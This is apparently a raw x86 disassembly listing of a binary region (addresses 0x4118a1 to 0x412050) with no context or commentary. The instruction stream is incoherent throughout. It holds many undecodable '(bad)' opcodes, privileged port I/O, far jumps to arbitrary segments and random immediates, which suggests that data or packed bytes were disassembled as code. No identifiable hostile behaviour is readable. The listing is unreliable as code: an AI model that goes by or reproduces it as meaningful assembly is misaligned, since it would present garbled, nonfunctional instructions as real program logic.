  4118a1:	mov    WORD PTR [edx-0x5],fs
  4118a4:	dec    esp
  4118a5:	cmp    al,0x3f
  4118a7:	cmp    DWORD PTR [ebp-0x66],0xffffffdf
  4118ab:	stos   DWORD PTR es:[edi],eax
  4118ac:	xor    eax,0x1791f473
  4118b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b2:	jle    0x41183a
  4118b4:	mov    al,0x44
  4118b6:	jns    0x4118d3
  4118b8:	stos   BYTE PTR es:[edi],al
  4118b9:	sub    ch,dl
  4118bb:	cmp    eax,esi
  4118bd:	adc    esi,DWORD PTR [esi]
  4118bf:	leave  
  4118c0:	idiv   DWORD PTR [eax+0x46]
  4118c3:	pop    esp
  4118c4:	jae    0x4118f6
  4118c6:	xchg   ebp,eax
  4118c7:	test   al,0x19
  4118c9:	cld    
  4118ca:	fs jb  0x411945
  4118cd:	cmp    BYTE PTR [ebx-0x10],0x7c
  4118d1:	cmp    esi,edi
  4118d3:	jb     0x411905
  4118d5:	sar    BYTE PTR [ecx+edx*1+0x6e42fe7],0xed
  4118dd:	mov    ss,WORD PTR [ebx+0x2f3126aa]
  4118e3:	imul   edi,DWORD PTR [esi-0x7947752b],0x2f6642b
  4118ed:	leave  
  4118ee:	call   0x3335:0x6338885d
  4118f5:	sar    edx,1
  4118f7:	jl     0x411951
  4118f9:	mov    BYTE PTR [edi-0x2d],dh
  4118fc:	mov    ebp,0xce053f14
  411901:	adc    DWORD PTR [eax+0x75],ecx
  411904:	xchg   DWORD PTR [ebx],esi
  411906:	dec    ebp
  411907:	mov    ecx,0xf0038173
  41190c:	outs   dx,DWORD PTR ds:[esi]
  41190d:	or     eax,0xa730ebd3
  411912:	in     al,0x8b
  411914:	sub    al,0x21
  411916:	push   esp
  411917:	jecxz  0x41198e
  411919:	fisubr DWORD PTR [ebp+ecx*8+0x28]
  41191d:	add    eax,0xda03cca1
  411922:	xchg   ebp,eax
  411923:	inc    esp
  411924:	out    dx,al
  411925:	cmp    BYTE PTR [eax],0x3b
  411928:	mov    bl,0x26
  41192a:	pop    ebp
  41192b:	jbe    0x41195d
  41192d:	ret    
  41192e:	scas   eax,DWORD PTR es:[edi]
  41192f:	push   0x38
  411931:	scas   al,BYTE PTR es:[edi]
  411932:	fwait
  411933:	cmp    bl,bl
  411935:	inc    edx
  411936:	mov    ebx,0xa4ea5695
  41193b:	sub    eax,0x5aaa6654
  411940:	test   al,0x2d
  411942:	dec    ebp
  411943:	out    dx,eax
  411944:	xor    DWORD PTR [ecx-0x2d],eax
  411947:	das    
  411948:	or     ebx,DWORD PTR [edi]
  41194a:	jecxz  0x41191a
  41194c:	sub    eax,0x140985b4
  411951:	ret    0x62e7
  411954:	and    eax,0x9bce9a43
  411959:	(bad)  
  41195b:	out    0xf8,eax
  41195d:	pop    ecx
  41195e:	mov    bl,0x8b
  411960:	or     esp,esi
  411962:	pop    ebx
  411963:	or     ch,bh
  411965:	and    al,0x9a
  411968:	scas   eax,DWORD PTR es:[edi]
  411969:	(bad)  
  41196a:	mov    esi,0x6b7914fb
  41196f:	ss xchg edi,eax
  411971:	es push edi
  411973:	inc    ebx
  411974:	xor    BYTE PTR fs:[ebx-0x450f8964],ch
  41197b:	pop    ecx
  41197c:	dec    esi
  41197d:	shl    BYTE PTR ds:0x1bb25995,cl
  411983:	adc    DWORD PTR [esi+0x41],edx
  411986:	mov    dl,0xcd
  411988:	sbb    DWORD PTR [edi-0x5a809dba],esp
  41198e:	ret    0x19c7
  411991:	mov    dh,0xb2
  411993:	cwde   
  411994:	sub    dh,BYTE PTR [ebx]
  411996:	stc    
  411997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411998:	scas   al,BYTE PTR es:[edi]
  411999:	sub    esi,DWORD PTR [esi-0x1d]
  41199c:	inc    eax
  41199d:	push   esp
  41199e:	and    ecx,DWORD PTR [eax+0x77]
  4119a1:	adc    al,0xd0
  4119a3:	xchg   esi,eax
  4119a4:	shl    DWORD PTR [eax],cl
  4119a6:	push   ecx
  4119a7:	mov    edx,gs
  4119a9:	leave  
  4119aa:	jns    0x41199a
  4119ac:	stos   DWORD PTR es:[edi],eax
  4119ad:	rol    DWORD PTR [edx+0x27924eb7],cl
  4119b3:	shl    DWORD PTR [edx],0x82
  4119b6:	rdtsc  
  4119b8:	bound  edi,QWORD PTR [ecx]
  4119ba:	cli    
  4119bb:	mov    ch,0x8e
  4119bd:	sbb    cl,BYTE PTR [edx]
  4119bf:	mov    BYTE PTR [ebp+0x79b9ec92],0xcd
  4119c6:	mov    ecx,0x1e49c284
  4119cb:	or     al,0x4b
  4119cd:	in     al,dx
  4119ce:	xor    BYTE PTR [ebx+0x24db43f1],dh
  4119d4:	retf   
  4119d5:	dec    eax
  4119d6:	dec    edx
  4119d7:	mov    bh,0x28
  4119da:	xor    esi,0x3a
  4119dd:	data16 lods al,BYTE PTR ds:[esi]
  4119df:	mov    cl,0xd1
  4119e1:	(bad)  
  4119e2:	jbe    0x4119dc
  4119e4:	ss dec esi
  4119e6:	imul   esp,ecx,0x1a
  4119e9:	mov    dl,0x1c
  4119eb:	push   eax
  4119ec:	xchg   edi,eax
  4119ed:	(bad)  
  4119ee:	outs   dx,BYTE PTR ds:[esi]
  4119ef:	mov    bh,0xb9
  4119f1:	inc    eax
  4119f2:	loopne 0x411a2b
  4119f4:	aad    0xe
  4119f6:	(bad)  [esi-0x6d0bda6d]
  4119fc:	push   ebp
  4119fd:	jg     0x411a77
  4119ff:	test   BYTE PTR [ebx-0x507d6636],al
  411a05:	fwait
  411a06:	mov    dl,0xd0
  411a08:	out    0x3b,al
  411a0a:	add    eax,0x3e321f8c
  411a0f:	cmp    dh,BYTE PTR [edi+0x24]
  411a12:	test   DWORD PTR [ecx+0x677d230f],0x9c6ea3fd
  411a1c:	mov    bl,0xbc
  411a1e:	add    al,0x62
  411a20:	scas   al,BYTE PTR es:[edi]
  411a21:	xchg   ebp,eax
  411a22:	pop    edi
  411a23:	add    eax,0xd077a3ae
  411a28:	int    0xf0
  411a2a:	sub    eax,0x13f7ec17
  411a2f:	sbb    ebp,esp
  411a31:	(bad)  
  411a32:	rcl    BYTE PTR [ecx+edi*2-0x5c378acb],0x6d
  411a3a:	iret   
  411a3b:	add    edx,esp
  411a3d:	push   ss
  411a3e:	(bad)  
  411a3f:	or     dh,BYTE PTR [eax+0x65f4c673]
  411a45:	jecxz  0x411a25
  411a47:	sub    BYTE PTR [ebx-0x32],0x14
  411a4b:	or     DWORD PTR [edx+0x75],esi
  411a4e:	ret    0x2581
  411a51:	push   ebp
  411a52:	cmp    esi,DWORD PTR [esp+edx*2-0x46]
  411a56:	jg     0x411a42
  411a58:	cli    
  411a59:	popa   
  411a5a:	mov    ebx,0x54895109
  411a5f:	mov    WORD PTR [edx+0x2fb44aca],?
  411a65:	ret    0x14ce
  411a68:	jb     0x411a36
  411a6a:	test   al,0xc4
  411a6c:	arpl   WORD PTR [ecx-0x3069dc55],sp
  411a72:	loope  0x411ab5
  411a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a75:	and    al,0x91
  411a77:	cmp    al,0x55
  411a79:	clc    
  411a7a:	mov    al,0xe8
  411a7c:	mov    al,0x4f
  411a7e:	pop    edi
  411a7f:	jae    0x411ab4
  411a81:	xor    ebp,DWORD PTR [ebx+0x64]
  411a84:	jbe    0x411a9b
  411a86:	mov    edi,0xfafe1e5c
  411a8b:	mov    bl,0xb5
  411a8d:	fldenv [edi]
  411a8f:	addr16 mov al,ds:0x428d
  411a93:	popf   
  411a94:	adc    eax,0xb5b554c1
  411a99:	lahf   
  411a9a:	mov    ah,0x17
  411a9c:	or     ah,BYTE PTR [edi]
  411a9e:	inc    eax
  411a9f:	data16 dec BYTE PTR ds:0x11945354
  411aa6:	pop    ebp
  411aa7:	rcl    BYTE PTR [esi],1
  411aa9:	push   ds
  411aaa:	mov    al,0xa6
  411aac:	push   cs
  411aad:	bt     DWORD PTR [esi+0x1921f1c1],edi
  411ab4:	out    0xf1,al
  411ab6:	push   0x75
  411ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab9:	hlt    
  411aba:	mov    ah,0x88
  411abc:	and    eax,0x7ea9147a
  411ac1:	dec    edi
  411ac2:	mov    edi,eax
  411ac4:	sub    al,0x68
  411ac6:	addr16 push ss
  411ac8:	loope  0x411ae2
  411aca:	shl    DWORD PTR [edx+0x6b63dcb3],1
  411ad0:	arpl   WORD PTR [esi+0x5b24d9e7],bx
  411ad6:	cmp    eax,0x72eaff6f
  411adb:	sub    ch,BYTE PTR [ebp+ecx*1-0x4728edb3]
  411ae2:	add    DWORD PTR ds:0xd899789f,esp
  411ae8:	jg     0x411b42
  411aea:	mov    BYTE PTR [ecx-0x90a0cc0],bh
  411af0:	dec    edx
  411af1:	pop    eax
  411af2:	js     0x411a79
  411af4:	mov    esp,0x8224204f
  411af9:	enter  0x77d,0xc2
  411afd:	pop    es
  411afe:	imul   ebx,DWORD PTR [ecx+0x6560c6ab],0x587325a
  411b08:	push   ecx
  411b09:	xchg   ecx,eax
  411b0a:	mov    BYTE PTR gs:[edx-0x53],ch
  411b0e:	jmp    FWORD PTR [ebp-0xcfeb8ba]
  411b14:	in     eax,0x1b
  411b16:	imul   edi,DWORD PTR ds:0xdd8ac6ea,0x3b
  411b1d:	scas   eax,DWORD PTR es:[edi]
  411b1e:	cmp    BYTE PTR [edi-0x70],0xf4
  411b22:	cmp    bh,BYTE PTR [ebp-0x6d65bb8b]
  411b28:	jne    0x411ae9
  411b2a:	push   cs
  411b2b:	sub    cl,BYTE PTR [ecx-0x10]
  411b2e:	sub    BYTE PTR [ecx],bh
  411b30:	loop   0x411b58
  411b32:	cli    
  411b33:	jmp    0xdb38:0x7528ef2b
  411b3a:	aam    0x59
  411b3c:	fcom   DWORD PTR [ecx]
  411b3e:	dec    ebx
  411b3f:	lods   al,BYTE PTR ds:[esi]
  411b40:	jnp    0x411b85
  411b42:	in     al,0x1
  411b44:	add    BYTE PTR [ecx+0x6be4315b],al
  411b4a:	leave  
  411b4b:	cmp    dl,BYTE PTR [ecx+0x13]
  411b4e:	mov    ch,0xa4
  411b50:	xchg   BYTE PTR [ecx],ch
  411b52:	pop    esi
  411b53:	push   cs
  411b54:	in     al,dx
  411b55:	(bad)  [ecx+0x59]
  411b58:	mov    ecx,0xa3332456
  411b5d:	stos   DWORD PTR es:[di],eax
  411b5f:	add    eax,0x2f860498
  411b64:	or     al,0xb1
  411b66:	xchg   BYTE PTR [edi+0x30],bh
  411b69:	imul   esp,edx,0xffffff83
  411b6c:	mov    dh,0xa9
  411b6e:	or     dh,BYTE PTR [ebx+ebp*8+0x5bab36f1]
  411b75:	int3   
  411b76:	popa   
  411b77:	pop    ds
  411b78:	mov    eax,0x1652a0ad
  411b7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b7e:	adc    al,0xf9
  411b80:	sbb    dh,BYTE PTR [eax-0x24fcd279]
  411b86:	int    0xf
  411b88:	loopne 0x411b82
  411b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8b:	pop    ecx
  411b8c:	push   0xb84da734
  411b91:	xchg   edx,eax
  411b92:	(bad)  
  411b93:	in     eax,dx
  411b94:	ss cwde 
  411b96:	cmp    esi,ecx
  411b98:	popf   
  411b99:	inc    ecx
  411b9a:	ss in  eax,dx
  411b9c:	mov    esi,0xd123d68e
  411ba1:	dec    edi
  411ba2:	stc    
  411ba3:	in     eax,dx
  411ba4:	lds    esp,FWORD PTR [eax]
  411ba6:	xor    DWORD PTR [esi-0x5a],0xe0b53c17
  411bad:	sub    eax,0x7d094b0e
  411bb2:	in     al,dx
  411bb3:	gs add cl,bl
  411bb6:	pop    esp
  411bb7:	psubusb mm5,mm3
  411bba:	ja     0x411c16
  411bbc:	ret    
  411bbd:	push   esi
  411bbe:	clc    
  411bbf:	daa    
  411bc0:	loopne 0x411c0e
  411bc2:	jno    0x411c19
  411bc4:	fiadd  WORD PTR [edx+0x68e1c366]
  411bca:	mov    esp,DWORD PTR [edx-0x59]
  411bcd:	clc    
  411bce:	and    al,0xc4
  411bd0:	div    DWORD PTR [eax-0x78386994]
  411bd6:	xchg   BYTE PTR [ecx],bl
  411bd8:	mov    ch,0xc2
  411bda:	adc    ch,BYTE PTR [ecx+0x1f54885b]
  411be0:	sahf   
  411be1:	add    BYTE PTR [esi],cl
  411be3:	jp     0x411c16
  411be5:	adc    eax,DWORD PTR [esi-0x32]
  411be8:	aad    0x77
  411bea:	repz mov bl,0x25
  411bed:	xchg   BYTE PTR ds:0xf2b9a502,ch
  411bf3:	pop    edi
  411bf4:	ss inc eax
  411bf6:	into   
  411bf7:	out    0xa0,eax
  411bf9:	xchg   ebp,eax
  411bfa:	js     0x411ba4
  411bfc:	leave  
  411bfd:	jp     0x411c60
  411bff:	jo     0x411c2d
  411c01:	pop    edi
  411c02:	inc    ebp
  411c03:	adc    BYTE PTR [eax+0x62af0d82],al
  411c09:	jmp    0x411c6b
  411c0b:	push   edx
  411c0c:	xchg   ecx,eax
  411c0d:	pop    ebx
  411c0e:	lods   eax,DWORD PTR ds:[esi]
  411c0f:	retf   
  411c10:	shl    DWORD PTR [edi+0x65],1
  411c13:	sbb    esi,DWORD PTR ds:0xf133bd7e
  411c19:	inc    esi
  411c1a:	popa   
  411c1b:	arpl   WORD PTR [edi],si
  411c1d:	adc    eax,0xdc6b0534
  411c22:	ficom  WORD PTR [ebx-0x29e1d75f]
  411c28:	mov    edi,0x64502e4
  411c2d:	fild   QWORD PTR [esi]
  411c2f:	fidivr DWORD PTR [ecx]
  411c31:	jmp    0x1f74dae7
  411c36:	test   al,0xf8
  411c38:	ss jle 0x411c73
  411c3b:	xor    eax,0xbbb59745
  411c40:	imul   ecx,DWORD PTR [ebp+0x39572c0e],0xfffffff0
  411c47:	dec    ebx
  411c48:	out    dx,al
  411c49:	mov    ch,0x63
  411c4b:	jmp    0x99dc:0x276905d0
  411c52:	test   DWORD PTR fs:[ebx],edi
  411c55:	es (bad) 
  411c57:	or     eax,0xc4ad1248
  411c5c:	stos   DWORD PTR es:[edi],eax
  411c5d:	push   esi
  411c5e:	sub    eax,DWORD PTR [edi-0x4eb8b472]
  411c64:	addr16 mov ebp,0x732b0875
  411c6a:	sub    cl,ch
  411c6c:	or     bl,al
  411c6e:	mov    al,ds:0x3096686d
  411c73:	mov    ebp,0x96cb2343
  411c78:	xchg   ebx,eax
  411c79:	and    BYTE PTR [edi+eiz*1-0x68c98a87],bh
  411c80:	ds cmp edx,eax
  411c83:	(bad)  
  411c84:	cmc    
  411c85:	jo     0x411ca5
  411c87:	shl    BYTE PTR [eax],cl
  411c89:	inc    esp
  411c8a:	add    eax,0xdc4c57bb
  411c8f:	mov    ds:0xf86ead03,eax
  411c94:	adc    bl,BYTE PTR [edx]
  411c96:	(bad)  
  411c97:	jmp    0x411c9c
  411c99:	imul   dx,WORD PTR [edx+eax*2+0x6d09213e],0xffe7
  411ca2:	sahf   
  411ca3:	mov    cl,0x89
  411ca5:	cs sub eax,0x9236d075
  411cab:	mov    dh,0x23
  411cad:	daa    
  411cae:	(bad)  
  411caf:	cs push edx
  411cb1:	xchg   edx,eax
  411cb2:	jge    0x411c7e
  411cb4:	pusha  
  411cb5:	jecxz  0x411cb2
  411cb7:	(bad)  
  411cb8:	aaa    
  411cb9:	int    0xed
  411cbb:	mov    al,ds:0x4e986398
  411cc0:	adc    al,0xa0
  411cc2:	adc    esi,DWORD PTR [eax]
  411cc4:	mov    dh,0x68
  411cc6:	mov    esp,0x9dcb40ca
  411ccb:	inc    BYTE PTR [edx-0x20]
  411cce:	data16 sub cl,BYTE PTR [eax+ecx*8]
  411cd2:	hlt    
  411cd3:	add    eax,0xc690424a
  411cd8:	gs jmp 0x411cae
  411cdb:	mov    ebx,0x7e834129
  411ce0:	into   
  411ce1:	inc    ebx
  411ce2:	xor    eax,0x1ab5c80
  411ce7:	aad    0x97
  411ce9:	dec    esp
  411cea:	jb     0x411d1c
  411cec:	aaa    
  411ced:	fs cmp al,0x24
  411cf0:	xchg   esp,eax
  411cf1:	cmp    BYTE PTR [eax+0x6046791b],ah
  411cf7:	jmp    0x3e01:0xf41e56dd
  411cfe:	push   ebp
  411cff:	rcr    BYTE PTR [ebp-0xe],1
  411d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d03:	cmp    DWORD PTR [ebx-0x3],esi
  411d06:	mov    eax,0x9e332cc0
  411d0b:	jns    0x411d6d
  411d0d:	cwde   
  411d0e:	fxch   st(5)
  411d10:	pop    es
  411d11:	das    
  411d12:	jecxz  0x411d49
  411d14:	adc    edx,DWORD PTR [eax-0x3d252569]
  411d1a:	xchg   ebx,ecx
  411d1c:	or     al,dh
  411d1e:	dec    edx
  411d1f:	dec    edx
  411d20:	pop    ecx
  411d21:	cmp    bh,dl
  411d23:	cwde   
  411d24:	es jmp ebp
  411d27:	rcr    BYTE PTR [ebp+ebx*1+0x6],cl
  411d2b:	adc    al,0x2f
  411d2d:	push   ecx
  411d2e:	cli    
  411d2f:	(bad)  
  411d30:	sub    al,0xee
  411d32:	push   0xffffffb2
  411d34:	out    dx,al
  411d35:	xchg   esp,eax
  411d36:	(bad)  
  411d37:	fmul   QWORD PTR [ecx]
  411d39:	add    DWORD PTR ds:0x575e2248,ebp
  411d3f:	sbb    bl,bh
  411d41:	jl     0x411d94
  411d43:	or     al,0x6e
  411d45:	or     ah,0x9
  411d48:	stos   DWORD PTR es:[edi],eax
  411d49:	push   0x2f
  411d4b:	push   es
  411d4c:	ds xchg ecx,eax
  411d4e:	add    BYTE PTR [edx],0xc3
  411d51:	mov    dh,0x58
  411d53:	xchg   esp,eax
  411d54:	push   ebx
  411d55:	jbe    0x411ceb
  411d57:	sub    edi,edx
  411d59:	bound  esp,QWORD PTR [ebx+0x2b]
  411d5c:	xchg   ch,ah
  411d5e:	popa   
  411d5f:	mov    ah,0xfb
  411d61:	rcr    BYTE PTR [bx+di],1
  411d64:	xchg   ebp,eax
  411d65:	mov    ah,0x4
  411d67:	xchg   edx,eax
  411d68:	inc    ecx
  411d69:	add    DWORD PTR ds:0xfe402fa1,ebp
  411d6f:	and    ah,BYTE PTR [esi+0x990e4da]
  411d75:	add    eax,0x6622eae5
  411d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d7b:	jae    0x411d78
  411d7d:	lea    ebp,[eiz*2-0x74fd9039]
  411d84:	jg     0x411dd1
  411d86:	jp     0x411d22
  411d88:	adc    edi,DWORD PTR [esi-0x63]
  411d8b:	test   BYTE PTR [eax-0x67793f50],al
  411d91:	sub    eax,0xfe853168
  411d96:	inc    esp
  411d97:	mov    bl,0xf2
  411d99:	rcl    DWORD PTR [ebx-0x1f],cl
  411d9c:	cmp    dl,BYTE PTR [esi+0x0]
  411d9f:	(bad)  
  411da0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411da1:	inc    edi
  411da2:	cld    
  411da3:	dec    ecx
  411da4:	stc    
  411da5:	(bad)  [ebx+0x799a5a91]
  411dab:	mov    ch,0x98
  411dad:	repz fdivp st(3),st
  411db0:	jle    0x411e31
  411db2:	pop    ss
  411db3:	popa   
  411db4:	push   ebx
  411db5:	int    0x9f
  411db7:	push   es
  411db8:	(bad)  
  411db9:	test   BYTE PTR [esi],0x6b
  411dbc:	jp     0x411df2
  411dbe:	push   edi
  411dbf:	xor    bh,BYTE PTR [edx-0x6241ceb3]
  411dc5:	cld    
  411dc6:	sbb    BYTE PTR [esi],dh
  411dc8:	mov    al,0xa1
  411dca:	xor    dh,BYTE PTR ds:0xd6842770
  411dd0:	xor    ecx,edi
  411dd2:	loope  0x411dd2
  411dd4:	clc    
  411dd5:	outs   dx,BYTE PTR ds:[esi]
  411dd6:	in     eax,dx
  411dd7:	(bad)  
  411dd8:	js     0x411d5e
  411dda:	call   0x9ca0a88d
  411ddf:	mov    cl,0xa2
  411de1:	jbe    0x411da6
  411de3:	lds    ebp,FWORD PTR [ebp-0x53c9dcb2]
  411de9:	mov    ecx,0x29b72095
  411dee:	jb     0x411e6e
  411df0:	or     eax,0xbc50b107
  411df5:	push   esi
  411df6:	xor    al,0x6b
  411df8:	div    cl
  411dfa:	sahf   
  411dfb:	inc    edx
  411dfc:	mov    dl,0xb6
  411dff:	add    DWORD PTR [esi+0x15e07b3],ebx
  411e05:	out    dx,eax
  411e06:	xchg   edx,eax
  411e07:	mov    al,0x26
  411e09:	xor    al,0x31
  411e0b:	stc    
  411e0c:	test   al,0x13
  411e0e:	mov    ch,0xcf
  411e10:	and    dh,BYTE PTR [ebx+0x63]
  411e13:	sbb    BYTE PTR [eax+eiz*8-0x1f],dh
  411e17:	ja     0x411dbf
  411e19:	cmp    esi,DWORD PTR [ebx+0x69c1f59a]
  411e1f:	xor    al,0xa0
  411e21:	sbb    bh,dl
  411e23:	jg     0x411e79
  411e25:	push   es
  411e26:	gs sahf 
  411e28:	lods   al,BYTE PTR ds:[esi]
  411e29:	not    BYTE PTR [edi+0x61e542fb]
  411e2f:	xchg   edi,eax
  411e30:	shl    cl,cl
  411e32:	jl     0x411dd6
  411e34:	fmulp  st(1),st
  411e36:	inc    edx
  411e37:	xchg   edi,eax
  411e38:	loopne 0x411e0e
  411e3a:	sub    al,0x77
  411e3c:	cmp    esi,esi
  411e3e:	push   edi
  411e3f:	rcl    edi,0x87
  411e42:	push   cs
  411e43:	xchg   edi,eax
  411e44:	xor    al,0x79
  411e46:	jecxz  0x411e10
  411e48:	call   0x1629:0xd9ecbfce
  411e4f:	jbe    0x411e58
  411e51:	shl    ebx,0xc8
  411e54:	inc    edi
  411e55:	push   ds
  411e56:	fwait
  411e57:	mov    ah,0x5e
  411e59:	mov    bl,0xff
  411e5b:	mov    esi,0x5f8a3cf
  411e60:	idiv   BYTE PTR [ecx]
  411e62:	cdq    
  411e63:	fs push 0xffffff96
  411e66:	xchg   ebx,eax
  411e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e68:	jmp    0x411ed0
  411e6a:	sub    ecx,DWORD PTR [esi+0x71]
  411e6d:	pop    esi
  411e6e:	fsubp  st(1),st
  411e70:	(bad)  
  411e71:	fimul  DWORD PTR fs:[ecx-0x3791fc2e]
  411e78:	push   esi
  411e79:	inc    eax
  411e7a:	dec    ecx
  411e7b:	jge    0x411e47
  411e7d:	outs   dx,DWORD PTR ds:[esi]
  411e7e:	fnstsw WORD PTR [esi-0x3c1bd6ed]
  411e84:	add    al,0x95
  411e86:	pusha  
  411e87:	aam    0x7b
  411e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e8a:	jmp    FWORD PTR [ebp+0x74]
  411e8d:	in     eax,dx
  411e8e:	sub    eax,0x8f9ecac7
  411e93:	test   DWORD PTR ds:0x324004a6,esi
  411e99:	repnz mov cl,BYTE PTR [esi]
  411e9c:	or     DWORD PTR [ebp+edi*8+0x4c97a0fb],esp
  411ea3:	sub    eax,0x2cd8dde0
  411ea8:	push   edx
  411ea9:	loope  0x411e58
  411eab:	xchg   DWORD PTR [edx+0x141b2828],eax
  411eb1:	xchg   esp,eax
  411eb2:	xor    ah,BYTE PTR [ebx+0xae79a37]
  411eb8:	sub    eax,0x8a5bd4a2
  411ebd:	adc    eax,0x963f9b19
  411ec2:	les    eax,FWORD PTR [edi]
  411ec4:	inc    BYTE PTR [ecx]
  411ec6:	daa    
  411ec7:	lahf   
  411ec8:	je     0x411e97
  411eca:	lea    ebx,[edi-0xc]
  411ecd:	adc    DWORD PTR [eax-0x1c],ecx
  411ed0:	lods   al,BYTE PTR ds:[esi]
  411ed1:	outs   dx,BYTE PTR ds:[esi]
  411ed2:	fdivr  QWORD PTR [edi-0x69b3cf29]
  411ed8:	cld    
  411ed9:	dec    ebx
  411eda:	int3   
  411edb:	xlat   BYTE PTR ds:[ebx]
  411edc:	cmc    
  411edd:	das    
  411ede:	push   0x2ea5f593
  411ee3:	stc    
  411ee4:	cmp    eax,0xc1722d65
  411ee9:	fcomip st,st(3)
  411eeb:	fldpi  
  411eed:	jae    0x411ec1
  411eef:	xchg   esp,eax
  411ef0:	stos   DWORD PTR es:[edi],eax
  411ef1:	cmc    
  411ef2:	mov    eax,ds:0xead61d68
  411ef7:	shr    BYTE PTR [ecx+0x57a30774],0x84
  411efe:	mov    ch,0xe1
  411f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f01:	jle    0x411efa
  411f03:	push   ecx
  411f04:	or     ecx,eax
  411f06:	loop   0x411ec5
  411f08:	js     0x411f87
  411f0a:	xchg   ecx,eax
  411f0b:	mov    al,0x43
  411f0d:	stos   DWORD PTR es:[edi],eax
  411f0e:	out    0xb6,eax
  411f10:	xchg   esp,eax
  411f11:	dec    edi
  411f12:	dec    eax
  411f13:	aaa    
  411f14:	in     eax,dx
  411f15:	and    eax,0x72e1a056
  411f1a:	mov    ebx,0xf61703ad
  411f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f20:	out    0xa7,al
  411f22:	pop    eax
  411f23:	mov    edx,0x27f4be67
  411f28:	fs push eax
  411f2a:	pop    eax
  411f2b:	mov    dl,0x47
  411f2d:	dec    ebx
  411f2e:	icebp  
  411f2f:	mov    edx,0x3278fbf4
  411f34:	js     0x411f2e
  411f36:	shr    ecx,cl
  411f38:	sbb    eax,0xcb5a1768
  411f3d:	repnz cmp BYTE PTR [ebx],bh
  411f40:	xchg   DWORD PTR [eax-0x50],ebx
  411f43:	stos   DWORD PTR es:[edi],eax
  411f44:	fidiv  DWORD PTR [ecx+0x51654f0b]
  411f4a:	pop    edx
  411f4b:	pop    edi
  411f4c:	jl     0x411f60
  411f4e:	dec    edi
  411f4f:	(bad)  
  411f51:	mov    dl,0xb5
  411f53:	mov    cl,ah
  411f55:	mov    bl,0x48
  411f57:	dec    ecx
  411f58:	sbb    cl,bl
  411f5a:	dec    eax
  411f5b:	xchg   ebp,eax
  411f5c:	je     0x411f71
  411f5e:	test   al,0x6
  411f60:	mov    eax,ds:0x72ea26ad
  411f65:	aas    
  411f66:	retf   
  411f67:	mov    edx,0xb848e926
  411f6c:	jecxz  0x411f15
  411f6e:	sub    DWORD PTR ss:[ebx],esp
  411f71:	ret    
  411f72:	ds inc esp
  411f74:	cmp    ah,BYTE PTR [edi-0x1b368026]
  411f7a:	sub    DWORD PTR [ecx-0x21],edx
  411f7d:	(bad)  
  411f7e:	adc    BYTE PTR [ecx+0x6d9df3b3],ah
  411f84:	pop    es
  411f85:	scas   al,BYTE PTR es:[edi]
  411f86:	jle    0x411fc7
  411f88:	loopne 0x411fd1
  411f8a:	mov    ah,BYTE PTR [ecx]
  411f8c:	psubd  mm7,QWORD PTR [edi+0x3c]
  411f90:	and    ch,ch
  411f92:	cmp    ebp,esi
  411f94:	dec    ecx
  411f95:	jbe    0x411fad
  411f97:	push   ebp
  411f98:	push   ecx
  411f99:	retf   
  411f9a:	in     al,0xab
  411f9c:	sahf   
  411f9d:	bound  esp,QWORD PTR [ecx-0x1e]
  411fa0:	add    al,0xca
  411fa2:	pop    edx
  411fa3:	mov    edi,0x38915a52
  411fa8:	cdq    
  411fa9:	ret    0x25c
  411fac:	aaa    
  411fad:	jl     0x411f4e
  411faf:	jge    0x411f34
  411fb1:	jl     0x411fe8
  411fb3:	dec    ecx
  411fb4:	add    eax,0x3a74e440
  411fb9:	int    0xc
  411fbb:	iret   
  411fbc:	adc    ebp,DWORD PTR [edx]
  411fbe:	cmp    al,0xc1
  411fc0:	(bad)  
  411fc1:	push   ss
  411fc2:	push   esi
  411fc3:	lods   al,BYTE PTR ds:[esi]
  411fc4:	aaa    
  411fc5:	mov    ds:0x23b3e3c5,al
  411fca:	jnp    0x411fd2
  411fcc:	out    dx,eax
  411fcd:	add    ebx,DWORD PTR [ebp-0x3bdf28c4]
  411fd3:	jge    0x411fb3
  411fd5:	xchg   edi,eax
  411fd6:	sub    eax,0x5facc696
  411fdb:	repnz push edi
  411fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fde:	imul   edi,DWORD PTR [ebp+edx*8+0x36],0xa15c1921
  411fe6:	sub    edi,DWORD PTR [ebp+0x62c3bf87]
  411fec:	rdmsr  
  411fee:	adc    al,0x82
  411ff0:	mov    ecx,0xc27095b7
  411ff5:	adc    ebx,DWORD PTR [ebx]
  411ff7:	les    eax,FWORD PTR ds:[ecx]
  411ffa:	mov    cl,0x80
  411ffc:	ins    BYTE PTR es:[edi],dx
  411ffd:	mov    al,ds:0x6ea211d
  412002:	jecxz  0x411f9b
  412004:	jg     0x411ffc
  412006:	jo     0x412008
  412008:	iret   
  412009:	pop    esp
  41200a:	bound  ebx,QWORD PTR [ecx+0x7f]
  41200d:	cdq    
  41200e:	jne    0x412005
  412010:	sub    BYTE PTR [edi+0x24f5f843],bh
  412016:	lock sub al,BYTE PTR [eax+0xc]
  41201a:	pop    esi
  41201b:	rcl    DWORD PTR [eax+0x13],cl
  41201e:	adc    DWORD PTR [ebx],edx
  412020:	jle    0x411fbf
  412022:	(bad)  
  412023:	mov    esi,0xf80d4621
  412028:	add    ch,BYTE PTR [ecx+0x61]
  41202b:	call   0x929c13a8
  412030:	dec    edi
  412031:	loope  0x411feb
  412033:	xor    al,0x2c
  412035:	jne    0x411fdc
  412037:	in     al,dx
  412038:	mov    bh,0xc
  41203a:	jp     0x412031
  41203c:	mov    BYTE PTR ds:0xa980e5da,ah
  412042:	cmc    
  412043:	pop    eax
  412044:	cwde   
  412045:	mov    WORD PTR [eax-0x7f720114],es
  41204b:	mov    eax,0x38f24bfb
  412050:	push   0xf822b74
